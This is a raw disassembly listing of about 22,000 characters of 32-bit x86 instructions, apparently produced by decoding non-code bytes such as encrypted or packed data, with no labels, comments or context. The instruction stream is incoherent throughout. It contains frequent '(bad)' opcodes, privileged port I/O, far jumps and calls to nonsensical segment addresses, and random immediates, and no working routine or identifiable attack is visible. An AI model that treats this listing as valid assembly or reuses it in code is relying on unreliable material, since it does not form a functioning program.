  40e25c:	cmp    DWORD PTR [ebx+0x7d],ecx
  40e25f:	or     eax,0x134b2b32
  40e264:	lods   eax,DWORD PTR ds:[esi]
  40e265:	cdq    
  40e266:	cld    
  40e267:	add    al,0x63
  40e269:	popa   
  40e26a:	out    dx,al
  40e26b:	push   0xba8050ea
  40e270:	add    BYTE PTR [edx+ecx*4-0x74e6c1d6],bl
  40e277:	mov    edi,0xe9988e85
  40e27c:	and    ecx,esp
  40e27e:	mov    eax,ds:0x57b86c72
  40e283:	out    0x55,eax
  40e285:	lds    esi,FWORD PTR [eax+0x1a]
  40e288:	daa    
  40e289:	mov    edx,esi
  40e28b:	aas    
  40e28c:	pop    esp
  40e28d:	cmp    BYTE PTR [ebp+0x297c5d0d],al
  40e293:	cwde   
  40e294:	pop    ss
  40e295:	xor    ebp,DWORD PTR ds:[edx+0x56b0f22a]
  40e29c:	pop    ss
  40e29d:	mov    ecx,0xdee15dd7
  40e2a2:	fbld   TBYTE PTR [esi-0x172f3d90]
  40e2a8:	scas   al,BYTE PTR es:[edi]
  40e2a9:	sub    bl,BYTE PTR [ecx-0x70]
  40e2ac:	xor    dl,BYTE PTR [edi-0x2e]
  40e2af:	push   ds
  40e2b0:	aam    0xff
  40e2b2:	test   BYTE PTR [edx+0x7061621d],dl
  40e2b8:	fidiv  DWORD PTR [ebp-0x52]
  40e2bb:	jmp    0xaff2:0x316b0cb9
  40e2c2:	jmp    0xf0fe:0x533619a6
  40e2c9:	and    edi,esi
  40e2cb:	inc    eax
  40e2cc:	dec    edi
  40e2cd:	rol    edi,cl
  40e2cf:	loop   0x40e311
  40e2d1:	or     dh,BYTE PTR [eax-0x703b2b7e]
  40e2d7:	loopne 0x40e29c
  40e2d9:	test   dl,0x8f
  40e2dc:	into   
  40e2dd:	xchg   ebx,eax
  40e2de:	lahf   
  40e2df:	jno    0x40e2ff
  40e2e1:	dec    edx
  40e2e2:	mov    bh,0xc4
  40e2e4:	xchg   edi,eax
  40e2e5:	loop   0x40e2a6
  40e2e7:	pop    edx
  40e2e8:	xchg   edx,eax
  40e2e9:	pusha  
  40e2ea:	vunpckhps xmm1,xmm2,XMMWORD PTR [ebx]
  40e2ee:	jb     0x40e315
  40e2f0:	cmp    eax,0xaa360c48
  40e2f5:	xchg   ebx,eax
  40e2f6:	hlt    
  40e2f7:	cld    
  40e2f8:	dec    ebp
  40e2f9:	(bad)
  40e2fc:	push   0x6a
  40e2fe:	mov    ?,WORD PTR gs:[ebx-0x574c932f]
  40e305:	shl    ch,1
  40e307:	or     BYTE PTR [edi+0x6],dl
  40e30a:	je     0x40e387
  40e30c:	mov    al,ds:0x32dd42a8
  40e311:	(bad)  
  40e313:	scas   al,BYTE PTR es:[edi]
  40e314:	movhps QWORD PTR [ecx+ecx*8+0x12],xmm1
  40e319:	pop    eax
  40e31a:	xchg   DWORD PTR [edi+ecx*8-0x6d783972],esi
  40e321:	adc    BYTE PTR [ecx-0x73],0x61
  40e325:	push   eax
  40e326:	mov    esp,0x1ea1d0a
  40e32b:	(bad)  
  40e32c:	adc    cl,ah
  40e32e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e32f:	adc    ebx,DWORD PTR [ecx]
  40e331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e332:	inc    ebx
  40e333:	jbe    0x40e2f0
  40e335:	jbe    0x40e2c7
  40e337:	in     al,0xeb
  40e339:	adc    DWORD PTR [ebx+eiz*4+0x29],0xfffffffc
  40e33e:	xor    DWORD PTR [ecx+edx*4+0x77],eax
  40e342:	cmp    eax,0x57ed8b13
  40e347:	mov    ebp,0x88586731
  40e34c:	cmp    BYTE PTR [ecx],dh
  40e34e:	call   0x996a:0x3b8ebb56
  40e355:	arpl   WORD PTR [edi+0x2a],si
  40e358:	inc    ebp
  40e359:	sbb    cl,dh
  40e35b:	cmp    eax,0x390d4ea4
  40e360:	aad    0x4c
  40e362:	pushf  
  40e363:	out    0x33,eax
  40e365:	dec    ecx
  40e366:	cs jge 0x40e3a2
  40e369:	or     BYTE PTR [ebx],cl
  40e36b:	mov    esi,0x54d070b2
  40e370:	pop    fs
  40e372:	imul   esp,ebx,0x8ea2eecc
  40e378:	dec    eax
  40e379:	ds pop es
  40e37b:	cmp    DWORD PTR [ebx],edx
  40e37d:	loope  0x40e31f
  40e37f:	jno    0x40e339
  40e381:	pusha  
  40e382:	imul   edx,DWORD PTR [edx-0x6ae91194],0xffffffbf
  40e389:	and    DWORD PTR [edx-0x69bfe900],eax
  40e38f:	(bad)  
  40e390:	lods   al,BYTE PTR ds:[esi]
  40e391:	add    dh,bl
  40e393:	imul   eax,DWORD PTR [ecx+0x18],0x6a5a2095
  40e39a:	or     ebx,esi
  40e39c:	fs push 0xa621b4e4
  40e3a2:	fwait
  40e3a3:	or     edx,DWORD PTR [edi+0x3fc54a43]
  40e3a9:	jnp    0x40e3df
  40e3ab:	pop    esi
  40e3ac:	shl    DWORD PTR [eax],cl
  40e3ae:	pop    ecx
  40e3af:	and    al,BYTE PTR [esi-0x76ff28e9]
  40e3b5:	mov    al,ds:0x5944a7b3
  40e3ba:	sub    al,0xbc
  40e3bc:	popa   
  40e3bd:	ficomp WORD PTR [edi]
  40e3bf:	stos   BYTE PTR es:[edi],al
  40e3c0:	xor    BYTE PTR [edx-0x44125fad],dl
  40e3c6:	sub    DWORD PTR [edi+0x75],0xe47c1837
  40e3cd:	jg     0x40e3c8
  40e3cf:	imul   ebx,DWORD PTR [ebx],0x56f52256
  40e3d5:	lds    ebp,FWORD PTR [edx-0x73aef04]
  40e3db:	add    BYTE PTR [edx-0x1464500f],dh
  40e3e1:	sub    dl,bl
  40e3e3:	inc    edi
  40e3e4:	clc    
  40e3e5:	dec    ebx
  40e3e6:	inc    eax
  40e3e7:	jg     0x40e3b2
  40e3e9:	les    ebx,FWORD PTR [ebx-0x466c435d]
  40e3ef:	mov    ch,0xf1
  40e3f1:	push   esp
  40e3f2:	fidivr WORD PTR ds:0xffe841df
  40e3f8:	lds    ebx,FWORD PTR [edi+esi*2]
  40e3fb:	std    
  40e3fc:	mov    ds:0x194476db,eax
  40e401:	leave  
  40e402:	add    BYTE PTR [ebp+0x65e3e10a],dl
  40e408:	in     eax,0xd0
  40e40a:	and    BYTE PTR [esi+0x39],dl
  40e40d:	fs pop ss
  40e40f:	push   ds
  40e410:	aad    0xc1
  40e412:	mov    ecx,0xa2d8c36b
  40e417:	int3   
  40e418:	test   BYTE PTR [esi+0x74],bh
  40e41b:	frstor [esi+edx*4-0x2049b159]
  40e422:	sahf   
  40e423:	pop    esp
  40e424:	call   0x15d1:0x62d50a63
  40e42b:	sbb    BYTE PTR [esi+eax*2+0x54fd165a],cl
  40e432:	sti    
  40e433:	jmp    0xdfca:0x7ba23aa8
  40e43a:	out    0x62,al
  40e43c:	pop    ds
  40e43d:	out    0x6c,al
  40e43f:	out    0xc0,al
  40e441:	sub    al,0xdd
  40e443:	sub    DWORD PTR [eax],ebx
  40e445:	cmp    al,0xd8
  40e447:	jp     0x40e3ec
  40e449:	xchg   ecx,eax
  40e44a:	cld    
  40e44b:	jae    0x40e4b5
  40e44d:	jl     0x40e463
  40e44f:	imul   esi,DWORD PTR [eax+0x62bf1297],0x1b
  40e456:	xchg   esp,eax
  40e457:	push   edx
  40e458:	test   DWORD PTR [ebx-0x5e],ebx
  40e45b:	mov    eax,ds:0x928f1e57
  40e460:	leave  
  40e461:	xchg   edx,eax
  40e462:	xchg   edx,eax
  40e463:	xor    eax,0xde4127ef
  40e468:	adc    eax,0x67e0f184
  40e46d:	out    dx,al
  40e46e:	pop    ebx
  40e46f:	pop    edi
  40e470:	mov    BYTE PTR [ecx+0x7b691d76],bh
  40e476:	push   ebx
  40e477:	mov    ah,0x7
  40e479:	lea    ebp,es:[eax]
  40e47c:	bound  esi,QWORD PTR [edi-0x6c6d5d5f]
  40e482:	adc    bl,cl
  40e484:	and    cl,0xf5
  40e487:	dec    esp
  40e488:	jmp    0x40e436
  40e48a:	(bad)  
  40e48b:	fisttp QWORD PTR [esi-0x5c]
  40e48e:	test   eax,0x7c6195ac
  40e493:	mov    ebx,0x18099caa
  40e498:	rol    DWORD PTR [eax-0x31],0x4
  40e49c:	and    eax,0x1ebf9911
  40e4a1:	xor    BYTE PTR [ebx+0x26c72bf9],0x4a
  40e4a8:	cs adc edi,edx
  40e4ab:	int3   
  40e4ac:	sub    al,ah
  40e4ae:	loopne 0x40e508
  40e4b0:	nop
  40e4b1:	adc    al,0x99
  40e4b3:	cwde   
  40e4b4:	test   eax,0x63bb4a14
  40e4b9:	sub    eax,0xbf2bae5e
  40e4be:	xchg   esp,eax
  40e4bf:	dec    eax
  40e4c0:	imul   esp,DWORD PTR [ebx+0x156231d3],0xf91e2abe
  40e4ca:	mov    ds:0xa3bf334d,al
  40e4cf:	arpl   WORD PTR [ecx+0x74f9edc8],dx
  40e4d5:	xor    esp,DWORD PTR [esi+0x57]
  40e4d8:	outs   dx,BYTE PTR ds:[esi]
  40e4d9:	xor    al,0x63
  40e4db:	cld    
  40e4dc:	pop    ds
  40e4dd:	pop    ds
  40e4de:	jbe    0x40e476
  40e4e0:	ret    
  40e4e1:	adc    BYTE PTR [edx+0x12],dl
  40e4e4:	push   edi
  40e4e5:	pop    es
  40e4e6:	pop    eax
  40e4e7:	or     al,0xd8
  40e4e9:	idiv   DWORD PTR [edi-0x5043223d]
  40e4ef:	scas   al,BYTE PTR es:[edi]
  40e4f0:	mov    eax,0x6275dbf6
  40e4f5:	fdivr  st,st(2)
  40e4f7:	or     ebp,ebx
  40e4f9:	lea    edx,[esi]
  40e4fb:	mov    ch,0xa6
  40e4fd:	sub    al,0x23
  40e4ff:	inc    DWORD PTR [ebp+edi*1+0x5d5712f1]
  40e506:	cmp    eax,ebp
  40e508:	cdq    
  40e509:	mov    es,WORD PTR [ebx+eiz*8]
  40e50c:	mov    WORD PTR [ebp+eiz*2-0x73],gs
  40e510:	and    al,0x46
  40e512:	xchg   ecx,eax
  40e513:	inc    esp
  40e514:	data16 das 
  40e516:	push   es
  40e517:	mov    ch,0x0
  40e519:	ja     0x40e4d1
  40e51b:	xchg   edx,eax
  40e51c:	or     edx,eax
  40e51e:	pop    ss
  40e51f:	fdiv   QWORD PTR [edx+0x63]
  40e522:	shl    ch,0xa4
  40e525:	stos   BYTE PTR es:[edi],al
  40e526:	dec    eax
  40e527:	aad    0x17
  40e529:	pop    es
  40e52a:	inc    ebp
  40e52b:	sbb    eax,0x95d0a693
  40e530:	or     DWORD PTR [esi],edi
  40e532:	pop    ebx
  40e533:	int3   
  40e534:	mov    cl,0xb2
  40e536:	shr    eax,cl
  40e538:	add    eax,0x4fa5af36
  40e53d:	jp     0x40e54e
  40e53f:	addr16 icebp 
  40e541:	shr    DWORD PTR [ebx-0x7f239341],0x96
  40e548:	mov    eax,0x5f84f46e
  40e54d:	(bad)  
  40e54e:	loopne 0x40e5a0
  40e550:	(bad)  
  40e551:	fild   DWORD PTR [ecx]
  40e553:	inc    ebx
  40e554:	sub    edi,eax
  40e556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e557:	pop    ebx
  40e558:	or     eax,0x26a7876d
  40e55d:	rol    DWORD PTR [ecx],0x92
  40e560:	icebp  
  40e561:	arpl   WORD PTR [edx],si
  40e563:	or     ebp,DWORD PTR [eax]
  40e565:	pop    edx
  40e566:	les    edi,FWORD PTR [ebx+0x44caeebb]
  40e56c:	jge    0x40e51a
  40e56e:	mov    esi,0x139b67cd
  40e574:	rep outs dx,BYTE PTR ds:[esi]
  40e576:	mov    ebx,0x3aa544c
  40e57b:	neg    BYTE PTR [ebx+0x67db524c]
  40e581:	stc    
  40e582:	mov    eax,0x76562c7c
  40e587:	arpl   WORD PTR [ecx-0x6bf3c254],sp
  40e58d:	call   0x90f31d77
  40e592:	ret    
  40e593:	pop    ebx
  40e594:	fdiv   QWORD PTR [edi-0x2e]
  40e597:	dec    ebx
  40e598:	push   esi
  40e599:	and    eax,0xc570e37e
  40e59e:	pop    esp
  40e59f:	lods   eax,DWORD PTR ds:[esi]
  40e5a0:	ss cmc 
  40e5a2:	push   ecx
  40e5a3:	inc    eax
  40e5a4:	and    eax,0x986efcca
  40e5a9:	sbb    edi,DWORD PTR [edx+0x69231792]
  40e5af:	cmp    eax,0xbff6b657
  40e5b4:	dec    ecx
  40e5b5:	pop    ecx
  40e5b6:	mov    ecx,0xac9d696f
  40e5bb:	popf   
  40e5bc:	dec    ecx
  40e5bd:	inc    edi
  40e5be:	jne    0x40e5b7
  40e5c0:	call   0xdeec:0x8c02854e
  40e5c7:	push   es
  40e5c8:	(bad)  
  40e5ca:	cmp    edx,ebx
  40e5cc:	sar    BYTE PTR [esi-0x5fe3019c],0x91
  40e5d3:	mov    esp,0xe8abc088
  40e5d8:	rol    BYTE PTR [esi-0x56],cl
  40e5db:	and    dh,bh
  40e5dd:	in     al,0xa7
  40e5df:	dec    esi
  40e5e0:	push   edi
  40e5e1:	add    al,0x9f
  40e5e4:	pcmpgtb mm5,QWORD PTR [edx+0x2abb30b9]
  40e5eb:	sub    edi,eax
  40e5ed:	mov    edx,0x7b21f1ac
  40e5f2:	into   
  40e5f3:	cmp    al,dl
  40e5f5:	sbb    bl,ch
  40e5f7:	jb     0x40e5ae
  40e5f9:	addps  xmm0,XMMWORD PTR [edx+0x631abdd9]
  40e600:	xchg   BYTE PTR [ebx],cl
  40e602:	pop    edi
  40e603:	pop    ebp
  40e604:	sar    DWORD PTR [esi-0x7b],1
  40e607:	loope  0x40e5e6
  40e609:	pop    eax
  40e60a:	lods   eax,DWORD PTR ds:[esi]
  40e60b:	aas    
  40e60c:	mov    esp,0x1eb010a5
  40e611:	adc    bh,BYTE PTR [edi+0x79]
  40e614:	pop    ebp
  40e615:	fs push edi
  40e617:	pusha  
  40e618:	and    DWORD PTR ds:0x23fc4fec,ecx
  40e61e:	outs   dx,DWORD PTR ds:[esi]
  40e61f:	fsub   QWORD PTR [esi+0x783033ef]
  40e625:	mov    BYTE PTR fs:[edx],ah
  40e628:	sbb    BYTE PTR [ebx+0x6da57019],al
  40e62e:	mov    ebp,0x8a46ae06
  40e633:	push   ebp
  40e634:	add    eax,0xd24d4a55
  40e639:	mov    ecx,esp
  40e63b:	push   ecx
  40e63c:	repz xlat BYTE PTR ds:[ebx]
  40e63e:	das    
  40e63f:	repnz add DWORD PTR [edx+0x5523d526],esi
  40e646:	jl     0x40e60c
  40e648:	mov    BYTE PTR [ebx+0x26],dl
  40e64b:	fs push esi
  40e64d:	sbb    bh,bh
  40e64f:	sub    al,0xd3
  40e651:	pop    esi
  40e652:	nop
  40e653:	xchg   ecx,eax
  40e654:	das    
  40e655:	xchg   edx,eax
  40e656:	mov    bl,0x95
  40e658:	dec    DWORD PTR ds:0x19fef372
  40e65e:	mov    al,0x6f
  40e660:	mov    dh,0xf2
  40e662:	sahf   
  40e663:	pushf  
  40e664:	ins    DWORD PTR es:[edi],dx
  40e665:	sbb    BYTE PTR [ecx],dl
  40e667:	and    BYTE PTR [ebp-0x7c],dl
  40e66a:	xor    bh,BYTE PTR [eax-0x51]
  40e66d:	or     ecx,0x8f89bf09
  40e673:	pop    esp
  40e674:	(bad)  
  40e675:	mov    ecx,0xbe633022
  40e67a:	and    edx,DWORD PTR [esi+0x3ef9d29c]
  40e680:	jne    0x40e668
  40e682:	test   DWORD PTR [esi+0x71209e17],0xb69e6929
  40e68c:	fcom   DWORD PTR [edi-0x25596248]
  40e692:	push   es
  40e693:	cs mov eax,0xc33b197e
  40e699:	pop    esi
  40e69a:	arpl   WORD PTR [esi+0x1b],dx
  40e69d:	fistp  WORD PTR [ebx]
  40e69f:	or     eax,0xf23284f9
  40e6a4:	inc    esi
  40e6a5:	js     0x40e6ca
  40e6a7:	daa    
  40e6a8:	dec    eax
  40e6a9:	bound  ecx,QWORD PTR [edx-0x1d]
  40e6ac:	sahf   
  40e6ad:	mov    dl,0x57
  40e6af:	mov    ah,0x92
  40e6b1:	pop    eax
  40e6b2:	rol    DWORD PTR fs:[edi],cl
  40e6b5:	pop    eax
  40e6b6:	loopne 0x40e656
  40e6b8:	scas   al,BYTE PTR es:[edi]
  40e6b9:	(bad)  
  40e6ba:	outs   dx,BYTE PTR es:[esi]
  40e6bc:	pop    esp
  40e6bd:	add    DWORD PTR [ebp+0x402375ac],eax
  40e6c3:	add    eax,0x982fed94
  40e6c8:	mov    ah,0x4e
  40e6ca:	popa   
  40e6cb:	push   cs
  40e6cc:	imul   BYTE PTR ds:0xf58219d0
  40e6d2:	push   0x6d
  40e6d4:	icebp  
  40e6d5:	test   DWORD PTR [eax+0x6f],esi
  40e6d8:	mov    al,ds:0x3372a90c
  40e6dd:	pop    edi
  40e6de:	ja     0x40e69c
  40e6e0:	and    eax,0xe9037e
  40e6e5:	fstp   QWORD PTR [edx]
  40e6e7:	call   0x82746050
  40e6ec:	mov    edx,0xfe9032dc
  40e6f1:	loopne 0x40e76f
  40e6f3:	cdq    
  40e6f4:	and    bh,BYTE PTR [eax]
  40e6f6:	mov    esi,0xddecad95
  40e6fb:	mov    edx,0xdf16ddf
  40e700:	pop    esi
  40e701:	repz jb 0x40e72e
  40e704:	add    DWORD PTR [edx-0x10],ecx
  40e707:	ins    DWORD PTR es:[edi],dx
  40e708:	ins    BYTE PTR es:[edi],dx
  40e709:	jae    0x40e72c
  40e70b:	outs   dx,DWORD PTR ds:[esi]
  40e70c:	pop    esp
  40e70d:	mov    ebp,0x2f918092
  40e712:	inc    edi
  40e713:	cld    
  40e714:	sti    
  40e715:	(bad)  
  40e717:	pushf  
  40e718:	out    dx,al
  40e719:	(bad)  
  40e71a:	arpl   WORD PTR [eax],dx
  40e71c:	mov    WORD PTR [ebp+0x30],fs
  40e71f:	js     0x40e760
  40e721:	shr    DWORD PTR [edx],1
  40e723:	adc    BYTE PTR [edx],al
  40e725:	pop    ecx
  40e726:	and    al,0x32
  40e728:	or     ebp,ebp
  40e72a:	pop    edi
  40e72b:	into   
  40e72c:	jae    0x40e779
  40e72e:	mov    al,ds:0x73d59f80
  40e733:	cmc    
  40e734:	pop    esp
  40e735:	xor    BYTE PTR [edx+0x71],ah
  40e738:	test   al,0x48
  40e73a:	fimul  WORD PTR [eax]
  40e73c:	js     0x40e6cb
  40e73e:	out    0x52,al
  40e740:	and    al,0xdf
  40e742:	nop
  40e743:	int    0xd5
  40e745:	pop    ebx
  40e746:	(bad)  [eax+0x49]
  40e749:	dec    ebx
  40e74a:	icebp  
  40e74b:	push   ebp
  40e74c:	mov    al,0x4
  40e74e:	mov    WORD PTR [ebx-0x757ddb9a],?
  40e754:	push   0xffffff94
  40e756:	jecxz  0x40e763
  40e758:	inc    eax
  40e759:	dec    edx
  40e75a:	jb     0x40e76a
  40e75c:	and    eax,0x59222896
  40e761:	fidivr WORD PTR [eax]
  40e763:	icebp  
  40e764:	mov    DWORD PTR [edi-0x2e],eax
  40e767:	rcr    BYTE PTR [eax+0x491b054c],cl
  40e76d:	sbb    al,0x95
  40e76f:	dec    esp
  40e770:	jo     0x40e70b
  40e772:	mov    ds:0x457ce9af,al
  40e777:	jbe    0x40e7ca
  40e779:	mov    bl,0x70
  40e77b:	sbb    al,0x6
  40e77d:	mov    WORD PTR [edi+0x6727bdcc],?
  40e783:	inc    edx
  40e784:	fwait
  40e785:	add    cl,BYTE PTR [edi]
  40e787:	fdiv   DWORD PTR [edi+0x79709970]
  40e78d:	xchg   edx,eax
  40e78e:	psubq  mm4,QWORD PTR [ebx+0x6c]
  40e792:	xlat   BYTE PTR ds:[ebx]
  40e793:	jno    0xcc8ed7b8
  40e799:	push   0xffffff97
  40e79b:	and    dh,bl
  40e79d:	sub    DWORD PTR [ebx-0x780c4b9f],0x7c
  40e7a4:	lea    ebx,[ecx]
  40e7a6:	adc    DWORD PTR [edi-0x580acdd0],0xffffffdf
  40e7ad:	iret   
  40e7ae:	inc    esp
  40e7af:	or     dl,BYTE PTR [esi+0x3a9c4fbb]
  40e7b5:	pop    ss
  40e7b6:	test   BYTE PTR [esi-0x6d],dh
  40e7b9:	cmp    esi,DWORD PTR [ecx+0x3c]
  40e7bc:	addr16 inc ecx
  40e7be:	ret    0xbc25
  40e7c1:	adc    al,0xc9
  40e7c3:	stos   BYTE PTR es:[edi],al
  40e7c4:	sub    eax,0xa612b677
  40e7c9:	(bad)  
  40e7ca:	aas    
  40e7cb:	dec    ebp
  40e7cc:	out    0xff,eax
  40e7ce:	lea    ecx,[ebp-0x53]
  40e7d1:	xor    eax,0xafc2ba04
  40e7d7:	adc    BYTE PTR [edx+eiz*4],ch
  40e7da:	or     eax,0x207db319
  40e7df:	push   ebp
  40e7e0:	retf   0x993e
  40e7e3:	scas   al,BYTE PTR es:[edi]
  40e7e4:	loope  0x40e7ed
  40e7e6:	ret    0x1651
  40e7e9:	pop    ecx
  40e7ea:	call   0xa6b1:0xb5d4e1df
  40e7f1:	jns    0x40e7f9
  40e7f3:	push   ebp
  40e7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7f5:	or     DWORD PTR [ebp+0x78],0x71
  40e7f9:	push   ecx
  40e7fa:	xchg   edx,eax
  40e7fb:	cmp    eax,0xa5f99d9d
  40e800:	xchg   ebp,eax
  40e801:	cmp    edi,DWORD PTR [edx+0x3d]
  40e804:	pop    esp
  40e805:	fisubr DWORD PTR [esi]
  40e807:	in     eax,dx
  40e808:	xor    dl,BYTE PTR [ebx+0x2c6c4092]
  40e80e:	mov    ecx,0xb72bf390
  40e813:	aad    0xf7
  40e815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e816:	mov    ebx,esp
  40e818:	call   0x54702996
  40e81d:	cmp    bl,dl
  40e81f:	pop    edi
  40e820:	xchg   edi,eax
  40e821:	inc    edi
  40e822:	adc    ecx,DWORD PTR [ecx+ebp*2-0x67]
  40e826:	ficomp DWORD PTR [ebx]
  40e828:	fistp  WORD PTR [edi]
  40e82b:	inc    eax
  40e82c:	cmp    ebx,edx
  40e82e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e82f:	fwait
  40e830:	push   ebx
  40e831:	je     0x40e7e1
  40e833:	inc    eax
  40e834:	pop    es
  40e835:	pop    esi
  40e836:	lea    esi,[esi]
  40e838:	ja     0x40e8ab
  40e83a:	fidiv  WORD PTR [eax-0x12e3343d]
  40e840:	pop    edi
  40e841:	cmp    BYTE PTR [ecx-0x62],ch
  40e844:	inc    ecx
  40e845:	push   ebp
  40e846:	push   0x70
  40e848:	stos   BYTE PTR es:[edi],al
  40e849:	push   ds
  40e84a:	retf   
  40e84b:	dec    esp
  40e84c:	loopne 0x40e87d
  40e84e:	inc    esi
  40e84f:	mov    esp,0x383839c5
  40e854:	stc    
  40e855:	xchg   DWORD PTR ds:0x3953b8d8,ebx
  40e85b:	cdq    
  40e85c:	leave  
  40e85d:	popf   
  40e85e:	loop   0x40e893
  40e860:	adc    DWORD PTR [edx],esi
  40e862:	pop    edi
  40e863:	mov    bh,0x3e
  40e865:	inc    ecx
  40e866:	pop    ss
  40e867:	push   eax
  40e868:	jl     0x40e834
  40e86a:	call   0xce05eecf
  40e86f:	into   
  40e870:	jnp    0x40e834
  40e872:	fxam   
  40e874:	test   eax,0xce5e4b08
  40e879:	push   es
  40e87a:	lds    edi,FWORD PTR [esi+edi*8]
  40e87d:	in     al,0xa1
  40e87f:	sub    BYTE PTR gs:[esp+ecx*1],dh
  40e883:	and    dl,0xe2
  40e886:	jp     0x40e8b9
  40e888:	stos   WORD PTR es:[edi],ax
  40e88a:	and    DWORD PTR [eax],0x76
  40e88d:	popf   
  40e88e:	pushf  
  40e88f:	imul   ebx,DWORD PTR [eax+0x595c2d86],0x74802d08
  40e899:	test   al,0x4c
  40e89b:	mov    esi,0x2b96aaff
  40e8a0:	int3   
  40e8a1:	call   0x724c:0x5bdd02b6
  40e8a8:	fisttp QWORD PTR [edx]
  40e8aa:	mov    eax,edi
  40e8ac:	mov    dl,0xe9
  40e8ae:	jbe    0x40e929
  40e8b0:	pop    ebp
  40e8b1:	fidivr DWORD PTR [ecx-0x79b0876c]
  40e8b7:	jo     0x40e887
  40e8b9:	xor    esi,esi
  40e8bb:	pop    ss
  40e8bc:	retf   0x4efd
  40e8bf:	cmp    eax,0xaa0839d2
  40e8c4:	pop    ds
  40e8c5:	shr    DWORD PTR gs:[esi-0x2e9bbd17],0x8a
  40e8cd:	jg     0x40e944
  40e8cf:	(bad)  
  40e8d0:	push   ss
  40e8d1:	pop    ebx
  40e8d2:	pushf  
  40e8d3:	call   0xc61bdd86
  40e8d8:	push   esp
  40e8d9:	cmp    eax,0x511f3d5b
  40e8de:	cmp    DWORD PTR ds:0x53b4e1bf,esp
  40e8e4:	jbe    0x40e962
  40e8e6:	ds rcr al,0xa7
  40e8ea:	cmp    dl,BYTE PTR ds:0x850958db
  40e8f0:	lods   al,BYTE PTR ds:[esi]
  40e8f1:	ffree  st(2)
  40e8f3:	cs xor al,0x43
  40e8f6:	inc    ebp
  40e8f7:	sbb    eax,0xceb10cd0
  40e8fc:	xchg   esi,eax
  40e8fd:	add    eax,esi
  40e8ff:	mov    edx,0x76401bd7
  40e904:	dec    esi
  40e905:	xor    esi,DWORD PTR [ecx]
  40e907:	(bad)  
  40e908:	mov    al,ds:0x8caefabd
  40e90d:	dec    eax
  40e90e:	dec    ecx
  40e90f:	stos   BYTE PTR es:[edi],al
  40e910:	or     ch,dl
  40e912:	retf   
  40e913:	addr16 and al,0xf5
  40e916:	(bad)  
  40e917:	or     al,0xd7
  40e919:	sbb    eax,0x1c29055a
  40e91e:	retf   
  40e91f:	push   0x9274a0a2
  40e924:	mov    bl,BYTE PTR [esi-0x3b]
  40e927:	jne    0x40e922
  40e929:	add    DWORD PTR [ebp-0x31f2b7c7],edi
  40e92f:	ds jno 0x40e926
  40e932:	lea    ebx,[edi+0x76ebe859]
  40e938:	fidivr DWORD PTR [eax+0x49d404c]
  40e93e:	adc    ecx,ebx
  40e940:	dec    eax
  40e941:	jg     0x40e991
  40e943:	addr16 sub dh,bh
  40e946:	imul   edi,DWORD PTR [esi],0x31ec244
  40e94c:	mov    bl,0x44
  40e94e:	jno    0x40e8ec
  40e950:	stos   DWORD PTR es:[edi],eax
  40e951:	and    BYTE PTR [edx+edx*4],cl
  40e954:	cli    
  40e955:	out    0x25,al
  40e957:	call   0xab5c:0x8d1aab83
  40e95e:	adc    esp,ecx
  40e960:	mov    ecx,esp
  40e962:	mov    ebx,DWORD PTR [ecx-0x59d4f721]
  40e968:	stc    
  40e969:	cmp    esp,ebp
  40e96b:	push   cs
  40e96c:	arpl   WORD PTR [esi],sp
  40e96e:	sti    
  40e96f:	lods   al,BYTE PTR ds:[esi]
  40e970:	leave  
  40e971:	cli    
  40e972:	mov    bl,0x75
  40e974:	jecxz  0x40e95b
  40e976:	rcr    DWORD PTR [edx+0x4e],cl
  40e979:	jo     0x40e911
  40e97b:	push   cs
  40e97c:	sub    BYTE PTR [edx-0x1f],bl
  40e97f:	mov    ebx,0x6dee5819
  40e984:	inc    ebx
  40e985:	or     eax,0xc0a621d6
  40e98a:	mov    bh,0xe8
  40e98c:	pop    esp
  40e98d:	scas   al,BYTE PTR es:[edi]
  40e98e:	push   edx
  40e98f:	mov    ebx,0xec19876d
  40e994:	shl    ch,1
  40e996:	mov    WORD PTR [ebp-0x3be4f48f],gs
  40e99c:	sub    eax,0xbfa26d36
  40e9a1:	jno    0x40e93c
  40e9a3:	cli    
  40e9a4:	or     eax,0xe2582058
  40e9a9:	dec    esp
  40e9aa:	sbb    esi,DWORD PTR [esi-0x5d]
  40e9ad:	fstp   DWORD PTR [ebx-0x2a]
  40e9b0:	into   
  40e9b1:	jecxz  0x40e9c7
  40e9b3:	jp     0x40e943
  40e9b5:	(bad)  
  40e9b6:	sub    DWORD PTR [edi-0x3d54cc87],eax
  40e9bc:	cmp    esp,DWORD PTR [esi+0x1b]
  40e9bf:	adc    BYTE PTR [ecx],bh
  40e9c1:	xor    al,0xa
  40e9c3:	mov    cl,0xf7
  40e9c5:	pusha  
  40e9c6:	popf   
  40e9c7:	inc    esp
  40e9c8:	add    bh,BYTE PTR [ebp+ecx*2-0xf]
  40e9cc:	test   eax,0xf455e62d
  40e9d1:	dec    ebp
  40e9d2:	not    DWORD PTR [ecx-0x454b04c6]
  40e9d8:	ret    
  40e9d9:	mov    eax,ds:0x9631f674
  40e9de:	iret   
  40e9df:	pop    edx
  40e9e0:	xor    ebx,ebp
  40e9e2:	test   eax,0x22d6dc6f
  40e9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9e8:	aas    
  40e9e9:	jl     0x40e9c7
  40e9eb:	add    al,BYTE PTR [ebx]
  40e9ed:	(bad)  
  40e9ee:	rcl    BYTE PTR [ebp+0x26],1
  40e9f1:	xchg   esi,eax
  40e9f2:	das    
  40e9f3:	test   dh,0x26
  40e9f6:	stc    
  40e9f7:	in     al,dx
  40e9f8:	mov    ds:0x71cdda00,al
  40e9fd:	lock dec edi
  40e9ff:	mov    ecx,0x51056ef1
  40ea04:	xor    al,0xf5
  40ea06:	xor    ecx,DWORD PTR [edx+edx*2+0x7e09f91e]
  40ea0d:	jg     0x40ea83
  40ea0f:	retf   
  40ea10:	mov    edx,0x509f7cb9
  40ea15:	ret    0xa1e5
  40ea18:	push   ebp
  40ea19:	mov    dl,0xa2
  40ea1b:	jecxz  0x40e9b3
  40ea1d:	cmc    
  40ea1e:	std    
  40ea1f:	das    
  40ea20:	or     eax,0x6b2114de
  40ea25:	jns    0x40e9de
  40ea27:	jo     0x40ea2a
  40ea29:	fsub   QWORD PTR [eax]
